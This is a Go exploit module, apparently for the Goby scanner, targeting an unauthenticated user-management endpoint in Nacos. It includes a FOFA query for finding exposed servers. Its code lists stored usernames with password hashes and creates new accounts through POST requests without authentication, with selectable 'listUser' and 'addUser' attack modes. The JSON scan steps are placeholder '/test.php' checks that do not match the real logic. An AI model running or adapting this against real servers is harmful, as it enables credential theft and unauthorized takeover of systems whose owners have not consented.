package exploits

import (
	"encoding/json"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Nacos interface unauthorized access vulnerability",
    "Description": "<p>Nacos is a platform for building dynamic service discovery, configuration management, and service management for cloud-native applications.</p><p>There is an unauthorized access vulnerability in the Nacos interface, which can be used to read important system information and control the system.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2023-08-08",
    "PostTime": "2023-08-08",
    "Author": "1794790963@qq.com",
    "FofaQuery": " title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "GobyQuery": " title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "Level": "3",
    "Impact": "<p>There is an unauthorized access vulnerability in the Nacos interface, which can be used to read important system information and control the system.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability temporarily, please contact the manufacturer to fix the vulnerability: <a href=\"https://nacos.io/\">https://nacos.io/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "listUser,addUser",
            "show": ""
        },
        {
            "name": "addUser",
            "type": "select",
            "value": "auto,custom",
            "show": "attackType=addUser"
        },
        {
            "name": "username",
            "type": "input",
            "value": "1552eedfe1caab87",
            "show": "addUser=custom"
        },
        {
            "name": "password",
            "type": "input",
            "value": "1552eedfe1caab87",
            "show": "addUser=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "Nacos 接口未授权访问漏洞",
            "Product": "NACOS",
            "Description": "<p>Nacos 是构建云原生应用的动态服务发现、配置管理和服务管理的平台。<br></p><p>Nacos 接口存在未授权访问漏洞，利用该漏洞可读取系统重要信息以及控制系统。</p>",
            "Recommendation": "<p>1、官方暂已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://nacos.io/\" target=\"_blank\">https://nacos.io/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Nacos 接口存在未授权访问漏洞，利用该漏洞可读取系统重要信息以及控制系统。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Nacos interface unauthorized access vulnerability",
            "Product": "NACOS",
            "Description": "<p>Nacos is a platform for building dynamic service discovery, configuration management, and service management for cloud-native applications.</p><p>There is an unauthorized access vulnerability in the Nacos interface, which can be used to read important system information and control the system.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability temporarily, please contact the manufacturer to fix the vulnerability: <a href=\"https://nacos.io/\" target=\"_blank\">https://nacos.io/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is an unauthorized access vulnerability in the Nacos interface, which can be used to read important system information and control the system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10831"
}`
	addUserFlagCm6r := func(hostInfo *httpclient.FixUrl, username, password string) (*httpclient.HttpResponse, error) {
		uris := []string{`/nacos/v1/auth/users?username={{username}}&password={{password}}`, `/v1/auth/users?username={{username}}&password={{password}}`}
		for _, uri := range uris {
			uri = strings.ReplaceAll(uri, `{{username}}`, username)
			uri = strings.ReplaceAll(uri, `{{password}}`, password)
			addUserRequest := httpclient.NewPostRequestConfig(uri)
			addUserRequest.VerifyTls = false
			addUserRequest.FollowRedirect = false
			rsp, err := httpclient.DoHttpRequest(hostInfo, addUserRequest)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			return rsp, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	listUserFlagCm6r := func(hostInfo *httpclient.FixUrl) ([]string, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		uris := []string{`/nacos/v1/auth/users?pageNo=1&pageSize=9`, `/v1/auth/users?pageNo=1&pageSize=9`}
		for _, uri := range uris {
			getRequestConfig.URI = uri
			rsp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			// json 反序列化
			var data map[string]interface{}
			err = json.Unmarshal([]byte(rsp.Utf8Html), &data)
			var userList []string
			if err != nil {
				continue
			}
			pageItems, ok := data["pageItems"].([]interface{})
			if !ok {
				continue
			}
			for _, item := range pageItems {
				itemData, ok := item.(map[string]interface{})
				if !ok {
					continue
				}
				username, ok := itemData["username"].(string)
				if !ok {
					continue
				}
				password, ok := itemData["password"].(string)
				if !ok {
					continue
				}
				userList = append(userList, username+"\t"+password)
			}
			return userList, nil
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			userList, err := listUserFlagCm6r(hostInfo)
			if err != nil || userList == nil {
				return false
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			username := goutils.B2S(ss.Params["username"])
			password := goutils.B2S(ss.Params["password"])
			adduser := goutils.B2S(ss.Params["addUser"])
			if attackType == "listUser" {
				userList, err := listUserFlagCm6r(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Output = strings.Join(userList, "\n")
				expResult.Success = true
			} else if attackType == "addUser" {
				if adduser == "auto" {
					username = goutils.RandomHexString(16)
					password = goutils.RandomHexString(16)
				}
				rsp, err := addUserFlagCm6r(expResult.HostInfo, username, password)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				if strings.Contains(rsp.Utf8Html, `create user ok!`) {
					expResult.Success = true
					expResult.Output = `username: ` + username + "\npassword: " + password
				} else {
					expResult.Success = false
					expResult.Output = rsp.Utf8Html
				}
			}
			return expResult
		},
	))
}
